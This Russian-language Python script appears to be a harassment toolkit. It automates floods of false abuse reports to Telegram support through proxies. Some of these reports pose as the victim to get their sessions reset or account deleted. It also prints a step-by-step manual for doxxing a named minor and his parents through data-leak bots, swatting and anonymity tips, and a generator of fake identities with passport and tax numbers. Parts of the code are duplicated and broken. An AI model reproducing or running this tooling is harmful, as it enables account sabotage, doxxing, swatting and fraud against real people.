banner = """|| earsy ||
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
              tg: @huskadam | BETA TEST
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
                              Main Menu

!!! автор не несет ответственность за ваши действия!!!


[1]снос канала              [15] пробив по номеру (не работает)
[9] снос через почту    [16] поиск по сайту
[4] мануал по доксу     [17] поиск по нику
[6] сват мануал             [18] генератор фейк личности
[7] анонимность           [19] поиск по ip
[500] самоснос             [666] напугай меня
[2] снос чата    
[188] снос ссесий        
[5] снос тг мануал
[3] снос аккаунта    
[77] создатель                [00] выйти                    """    

print(banner)

        
import smtplib
from colorama import init, Fore
from faker import Faker
from pprint import pprint
import time
import pprint
import progress.bar as pb
import random
import string
import socket
import phonenumbers
from phonenumbers import timezone, carrier, geocoder
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import sys
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
                
import os
import write
import socket
import datetime
device_name = socket.gethostname()
ip_address = socket.gethostbyname(device_name)
current_time = datetime.datetime.now()
from colorama import init, Fore, Style
import requests
import time
import random
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored
import platform
import os
import select
import socket
import pystyle
import phonenumbers, phonenumbers.timezone, phonenumbers.carrier, phonenumbers.geocoder
import requests
import whois
import random
import colorama
import threading
import string
import faker
import bs4
import urllib.parse
import colorama
import concurrent.futures
import csv
import sys
import time
import requests
import random
from datetime import datetime
import platform
import socket
import datetime

menu = input("\nВведите запрос - ")
if menu == "1":
    message = input('Введите ссылку на канал: ')
    if message.startswith("t.me/"):
        huskadam = 0
        url = 'https://telegram.org/support'

        def send_complaint(text, contact):
            payload = {
                'text': text,
                'contact': contact
            }
            proxies = {
                'http': '50.168.163.179:80',
                'http': '97.107.131.77:80',
                'http': '162.223.94.166:80',
                'http': '139.60.209.2:80',
                'http': '162.245.81.45:80',
                'http': '50.171.187.50:80',
                'http': '50.171.187.51:80',
                'http': '50.168.163.182:80',

            }
            response = requests.post(url, data=payload, proxies=proxies)
            if response.status_code == 200:
                os.system('clear')
                sys.stdout.write("\033[2J\033[H")
                print(f"Жалоба отправлена. Всего жалоб: {huskadam}")
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

        text = [
            f'Этот канал {message} был создан с целью собрать сообщество, занимающееся дискредитацией и насмешками над людьми, что может привести к тому, что дети станут объектами насмешек, влекущих за собой негативные последствия. Настоятельно прошу предпринять действия и заблокировать эту группу.',
            f'Аккаунт {message} занимается предоставлением нелегальных услуг, распространением частной информации и созданием угрозы для жизни. Просьба принять соответствующие меры и заблокировать этого пользователя.',
        ]
        contact = [
            "+79865688802",
            "+79006060609",
            "+79517778686",
            "+79315944444",
            "+79314489652",
            "+79237778291",
            "+79057627288",
            "+79313722222",
        ]
        while True:
            huskadam += 1
            time.sleep(1)
            chosen_text = random.choice(text)
            chosen_contact = random.choice(contact)
            send_complaint(chosen_text, chosen_contact)
            if huskadam == 10:
                text1 = "Задачу выполнил\n30 жалоб в час на 1 канал, чтобы не было проблем\nС уважением ваш хушка, до встречи :3"
                for char in text1:
                    print(char, end='', flush=True)
                    time.sleep(0.1)
                break
    else:
        print('Не вижу ссылки на канал.. Он должен начинаться на t.me/')


if menu == "2":
    message = input('Введите ссылку на чат: ')
    if message.startswith("t.me/"):
        huskadam = 0
        url = 'https://telegram.org/support'

        def send_complaint(text, contact):
            payload = {
                'text': text,
                'contact': contact
            }
            proxies = {
                'http': '50.168.163.179:80',
                'http': '97.107.131.77:80',
                'http': '162.223.94.166:80',
                'http': '139.60.209.2:80',
                'http': '162.245.81.45:80',
                'http': '50.171.187.50:80',
                'http': '50.171.187.51:80',
                'http': '50.168.163.182:80',

            }
            response = requests.post(url, data=payload, proxies=proxies)
            if response.status_code == 200:
                os.system('clear')
                sys.stdout.write("\033[2J\033[H")
                print(f"Жалоба отправлена. Всего жалоб: {huskadam}")
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

        text = [
            f'Этот канал {message} был создан с целью собрать сообщество, занимающееся дискредитацией и насмешками над людьми, что может привести к тому, что дети станут объектами насмешек, влекущих за собой негативные последствия. Настоятельно прошу предпринять действия и заблокировать эту группу.',
            f'Аккаунт {message} занимается предоставлением нелегальных услуг, распространением частной информации и созданием угрозы для жизни. Просьба принять соответствующие меры и заблокировать этого пользователя.',
        ]
        contact = [
            "+79757987888",
            "+79964752688",
            "+79969273829",
            "+79387339286",
            "+79886880601",
            "+79879778110",
            "+79966435778",
            "+79937776323",
            "+79237754578",
            "+79006060609",
            "+79517778686",
            "+79315944444",
            "+79313722222",
        ]
        while True:
            huskadam += 1
            time.sleep(1)
            chosen_text = random.choice(text)
            chosen_contact = random.choice(contact)
            send_complaint(chosen_text, chosen_contact)
            if huskadam == 10:
                text1 = "Задачу выполнил\n30 жалоб в час на 1 чат, чтобы не было проблем\nС уважением ваш хушка, до встречи :3"
                for char in text1:
                    print(char, end='', flush=True)
                    time.sleep(0.1)
                break
    else:
        print('Не вижу ссылки на чат. Он должен начинатся на t.me/')
        
if menu == "3":
    message = input('Введите ссылку на аккаунт: ')
    if message.startswith("@"):
        huskadam = 0
        url = 'https://telegram.org/support'

        def send_complaint(text, contact):
            payload = {
                'text': text,
                'contact': contact
            }
            proxies = {
                'http': '50.168.163.179:80',
                'http': '97.107.131.77:80',
                'http': '162.223.94.166:80',
                'http': '139.60.209.2:80',
                'http': '162.245.81.45:80',
                'http': '50.171.187.50:80',
                'http': '50.171.187.51:80',
                'http': '50.168.163.182:80',

            }
            response = requests.post(url, data=payload, proxies=proxies)
            if response.status_code == 200:
                os.system('clear')
                sys.stdout.write("\033[2J\033[H")
                print(f"Жалоба отправлена. Всего жалоб: {huskadam}")
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

        text = [
            f'Этот канал {message} был создан с целью собрать сообщество, занимающееся дискредитацией и насмешками над людьми, что может привести к тому, что дети станут объектами насмешек, влекущих за собой негативные последствия. Настоятельно прошу предпринять действия и заблокировать эту группу.',
            f'Аккаунт {message} занимается предоставлением нелегальных услуг, распространением частной информации и созданием угрозы для жизни. Просьба принять соответствующие меры и заблокировать этого пользователя.',
        ]
        contact = [     
            "+79757987888",
            "+79964752688",
            "+79969273829",
            "+79387339286",
            "+79886880601",
            "+79879778110",
            "+79966435778",
            "+79937776323",
            "+79237754578",
            "+79006060609",
            "+79517778686",
            "+79315944444",
            "+79313722222",
        ]
        while True:
            huskadam += 1
            time.sleep(1)
            chosen_text = random.choice(text)
            chosen_contact = random.choice(contact)
            send_complaint(chosen_text, chosen_contact)
            if huskadam == 10:
                text1 = "10 жалоб отравлено\nдля продолжения перезапустите софт"
                for char in text1:
                    print(char, end='', flush=True)
                    time.sleep(0.1)
                break
    else:
        print('Не вижу ссылки на чат. Он должен начинатся на @')
        
if menu == "188":
    message = input('Введите номер и юз жертвы, пример +79994752688 - @yourtag ')
    if message.startswith(""):
        huskadam = 0
        url = 'https://telegram.org/support'

        def send_complaint(text, contact):
            payload = {
                'text': text,
                'contact': contact
            }
            proxies = {
                'http': '50.168.163.179:80',
                'http': '97.107.131.77:80',
                'http': '162.223.94.166:80',
                'http': '139.60.209.2:80',
                'http': '162.245.81.45:80',
                'http': '50.171.187.50:80',
                'http': '50.171.187.51:80',
                'http': '50.168.163.182:80',

            }
            response = requests.post(url, data=payload, proxies=proxies)
            if response.status_code == 200:
                os.system('clear')
                sys.stdout.write("\033[2J\033[H")
                print(f"Жалоба отправлена. Всего жалоб: {huskadam}")
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

        text = [
            f'Добрый день, команда поддержки. По недоразумению я перешел по ссылке мошенников и потерял доступ к своему профилю. Мое имя пользователя и номер  {message}. Прошу вас удалить мой аккаунт или сбросить все сессии.',
            f'Приветствую, команда техподдержки. Неосторожно я кликнул по ссылке-ловушке и лишился доступа к своему профилю. Мой номер и юзернейм {message} Будьте добры, либо удалите мой профиль, либо сбросьте текущие сессии.',
        ]
        contact = [
            "+79757987888",
            "+79878738298",
            "+79777877888",
            "+79059715662",
            "+79964752688",
            "+79969273829",
            "+79387339286",
            "+79886880601",
            "+79879778110",
            "+79966435778",
            "+79937776323",
            "+79237754578",
            "+79006060609",
            "+79517778686",
            "+79315944444",
            "+79313722222",
        ]
        while True:
            huskadam += 1
            time.sleep(1)
            chosen_text = random.choice(text)
            chosen_contact = random.choice(contact)
            send_complaint(chosen_text, chosen_contact)
            if huskadam == 10:
                text1 = "Задачу выполнил\n30 жалоб в час на 1 чат, чтобы не было проблем\nС уважением ваш хушка, до встречи :3"
                for char in text1:
                    print(char, end='', flush=True)
                    time.sleep(0.1)
                break
    else:
        print('Не вижу ссылки на чат. Он должен начинатся на t.me/')
        
if menu == "77":
        print("создан 18 июня 2024 года | приватный софт, созданный чтобы уничтожать. | создатель - @huskadam. с уважением huskadam")

if menu == "00":
	exit()
	
if menu == "4":
        print('''\nВ этом руководстве я подробно опишу, как найти практически любого человека, который не обеспечен должным уровнем защиты в интернете. Этот метод будет полезен для новичков, хотя профессионалы могут найти его недостаточно сложным. Руководство будет основано на легком, но эффективном проникновении через ботов, ссылки на которых я предоставлю в самом низу.

Итак, приступим. У нас есть аккаунт в Telegram - это все, что нам нужно. Основная цель - получить номер телефона или хотя бы имя и область/город. Как мы это делаем? В Telegram существуют боты-сервисы, способные предоставить вам номер телефона практически любого аккаунта в этой платформе. Вот список таких ботов:

1. Глаз Бога
2. Quick Osint
3. GtaSearch
4. BlackatSearch
5. Криптоскан
6. Telegram Analyst
7. Leak Osint 

Получили номер. Затем используем сочетание трех ботов - Универсал, Глаз Бога и Юзерсбокс. Заходим в Глаз Бога и начинаем поиск...

Теперь у нас есть два варианта развития событий, и я рассмотрю наиболее сложный.

Допустим, мы нашли только регион проживания жертвы, страну, имя и фамилию. Что дальше? Перепроверяем, используя Универсал, который предоставляет информацию о социальных сетях, зарегистрированных на этот номер телефона. Мы убеждаемся в правильности фамилии и имени, а иногда даже отчества.

Так. Мы получили правдоподобную информацию, включающую имя, фамилию и регион жертвы. Мы вводим эти данные в Юзерсбокс и ищем. Получаем результаты, включающие либо саму жертву, либо список людей с подобными данными. Как найти нужного? Ориентируемся на возраст и адрес. Затем снова обращаемся к Универсалу и проверяем результаты, ища подтверждение в виде даты рождения или города. Нашли. Получаем следующие данные:

Зузурин Михаил, 12.12.2008, Краснодарский край.

Вводим их также в Юзерсбокс и ищем, находим номер или несколько, просматриваем их и собираем информацию. Затем проверяем ФИО + дату рождения в Глазе Бога, где находим еще больше информации и добавляем ее в текстовый файл, придавая всему свой стиль.

Теперь, допустим, вы нашли саму жертву, но нужно найти его родителей? Не проблема. В процессе поиска жертвы мы однозначно получили часть данных о ее отце. Что у нас есть:

Зузурин Михаил Александрович, 12.12.2008, Краснодарский край.

Что мы делаем? Ищем: Зузурин Александр, Краснодар. Далее все просто. Мы ищем и сверяем адрес с ранее найденным, также учитываем возраст. Отлично, Шерлок! Вы нашли отца. Зузурин Александр Николаевич, 15.04.1976. Проверяем ФИО и дату рождения в Юзерсбоксе и Глазе Бога, получаем результаты, пробивая их также по номеру.

Как найти мать? На основе найденной информации об отце мы получаем его номер, на который однозначно зарегистрирована какая-то социальная сеть. Достаем любую фотографию и отправляем ее в Глаз Бога в поисках VKонтakte. Мы находим профиль отца, где либо в подписках будет его жена, либо ее можно увидеть на аватарке. Затем проверяем либо найденный VK, либо фотографию жены, и снова пробиваем VK.

Как достать номер из VKонтakte? Существует три бота, которые могут это сделать:

1. VKHistory
2. Глаз Бога
3. Юзерсбокс

Ой, проблема. Нигде не удалось найти номер. Что делать? В профиле жены в VK указаны имя, фамилия, дата рождения, а также известен город проживания. Мы вводим эти данные в Юзерсбокс и ищем:

Зузурина Мария, 24.05.1978, Краснодар.

Находим информацию, начинаем проверять по номеру и записываем результаты.

Готово! Написано досье на жертву и ее родителей исключительно с использованием ботов в Telegram. Поздравляю!\n''')

if menu == "7":
	print("купи физ, с физа анонку, юзай впн перед входом и бомба пон")
if menu == "6":
    print("на пк скачиваем скайп,  устанавливаем норм впн, покупаем физ +1, звоним и че хотите.")    
if menu == "500":
    message = input('Введите текст жалобы - ')
    if message.startswith(""):
        huskadam = 0
        url = 'https://telegram.org/support'

        def send_complaint(text, contact):
            payload = {
                'text': text,
                'contact': contact
            }
            proxies = {
                'http': '50.168.163.179:80',
                'http': '97.107.131.77:80',
                'http': '162.223.94.166:80',
                'http': '139.60.209.2:80',
                'http': '162.245.81.45:80',
                'http': '50.171.187.50:80',
                'http': '50.171.187.51:80',
                'http': '50.168.163.182:80',

            }
            response = requests.post(url, data=payload, proxies=proxies)
            if response.status_code == 200:
                os.system('clear')
                sys.stdout.write("\033[2J\033[H")
                print(f"Жалоба отправлена. Всего жалоб: {huskadam}")
            else:
                print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

        text = [
            f'{message}.',
            f'{message}.',
        ]
        contact = [
            "+79757987888",
            "+79964752688",
            "+79969273829",
            "+79387339286",
            "+79886880601",
            "+79879778110",
            "+79966435778",
            "+79937776323",
            "+79237754578",
            "+79006060609",
            "+79517778686",
            "+79315944444",
            "+79313722222",
        ]
        while True:
            huskadam += 1
            time.sleep(1)
            chosen_text = random.choice(text)
            chosen_contact = random.choice(contact)
            send_complaint(chosen_text, chosen_contact)
            if huskadam == 10:
                text1 = "Задачу выполнил\n30 жалоб в час на 1 чат, чтобы не было проблем\nС уважением ваш хушка, до встречи :3"
                for char in text1:
                    print(char, end='', flush=True)
                    time.sleep(0.1)
                break
    else:
        print('Не вижу ссылки на чат. Он должен начинатся на t.me/')
        
if menu == "5":
	print("наху? у тя скрипт сносер")
if menu == "9":
	print("в разработке...")

if menu == "16":
        domain = pystyle.Write.Input("\n[?] Введите сайт -> ", pystyle.Colors.green, interval = 0.005)
        def get_website_info(domain):
            domain_info = whois.whois(domain)
            print_string = f"""
[+] Домен: {domain_info.domain_name}
[+] дата регистрации: {domain_info.creation_date}
[+] Истекает: {domain_info.expiration_date}  
[+] Владелец: {domain_info.registrant_name}
[+] Организация: {domain_info.registrant_organization}
[+] Адрес: {domain_info.registrant_address}
[+] Город: {domain_info.registrant_city}
[+] Штат: {domain_info.registrant_state}
[+] Почтовый индекс: {domain_info.registrant_postal_code}
[+] Страна: {domain_info.registrant_country}
[+] IP-адрес: {domain_info.name_servers}
"""
            pystyle.Write.Print(print_string, pystyle.Colors.green, interval=0.005)
        get_website_info(domain)
if menu == "17":
        nick = pystyle.Write.Input(f"\n[?] Введите никнейм -> ", pystyle.Colors.green, interval=0.005)
        urls = [
            f"https://www.instagram.com/{nick}",
            f"https://www.tiktok.com/@{nick}",
            f"https://twitter.com/{nick}",
            f"https://www.facebook.com/{nick}",
            f"https://www.youtube.com/@{nick}",
            f"https://t.me/{nick}",
            f"https://www.roblox.com/user.aspx?username={nick}",
            f"https://www.twitch.tv/{nick}",
        ]
        for url in urls:
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    pystyle.Write.Print(f"\n{url} - аккаунт найден", pystyle.Colors.green, interval=0.005)
                elif response.status_code == 404:
                    pystyle.Write.Print(f"\n{url} - аккаунт не найден", pystyle.Colors.green, interval=0.005)
                else:
                    pystyle.Write.Print(f"\n{url} - ошибка {response.status_code}", pystyle.Colors.green, interval=0.005)
            except:
                pystyle.Write.Print(f"\n{url} - ошибка при проверке", pystyle.Colors.green, interval=0.005)
        print()
	
if menu == "18":
        fake = faker.Faker(locale="ru_RU")
        gender = pystyle.Write.Input("\n[?] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.green, interval=0.005)
        print()
        if gender not in ["М", "Ж"]:
            gender = random.select(["М", "Ж"])
            pystyle.Write.Print(f"[!] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n", pystyle.Colors.green, interval=0.005)
        if gender == "М":
            first_name = fake.first_name_male()
            middle_name = fake.middle_name_male()
        else:
            first_name = fake.first_name_female()
            middle_name = fake.middle_name_female()
        last_name = fake.last_name()
        full_name = f"{last_name} {first_name} {middle_name}"
        birthdate = fake.date_of_birth()
        age = fake.random_int(min=18, max=80)
        street_address = fake.street_address()
        city = fake.city()
        region = fake.region()
        postcode = fake.postcode()
        address = f"{street_address}, {city}, {region} {postcode}"
        email = fake.email()
        phone_number = fake.phone_number()
        inn = str(fake.random_number(digits=12, fix_len=True))
        snils = str(fake.random_number(digits=11, fix_len=True))
        passport_num = str(fake.random_number(digits=10, fix_len=True))
        passport_series = fake.random_int(min=1000, max=9999)
        pystyle.Write.Print(f"[+] ФИО: {full_name}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Пол: {gender}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Возраст: {age} лет\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Адрес: {address}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Email: {email}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Телефон: {phone_number}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] ИНН: {inn}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] СНИЛС: {snils}\n", pystyle.Colors.green, interval=0.005)
        pystyle.Write.Print(f"[+] Паспорт серия: {passport_series} номер: {passport_num}\n", pystyle.Colors.green, interval=0.005)

if menu == "666":
      print("сверяй данные снизу:)\n")
      print(f"{device_name}\n")
      print(f"{ip_address}\n")
      print(f"{current_time}\n")
      print("отпраляю данные на сервер...")
if menu == "19":
        ip = pystyle.Write.Input("\n[?] Введите IP-адрес -> ", pystyle.Colors.green, interval = 0.005)
def ip_lookup(ip):
            url = f"http://ip-api.com/json/{ip}"
            try:
                response = requests.get(url)
                data = response.json()
                if data.get("status") == "fail":
                    pystyle.Write.Print(f"[!] Произошла ошибка: {data['message']}\n", pystyle.Colors.green, interval=0.005)
                info = ""
                for key, value in data.items():
                    info += f"[+] {key}: {value}\n"
                return info
            except Exception as e:
                pystyle.Write.Print(f"[!] Произошла ошибка: {str(e)}\n", pystyle.Colors.green, interval=0.005)
pystyle.Write.Print(ip_lookup(ip), pystyle.Colors.green, interval=0.005)
    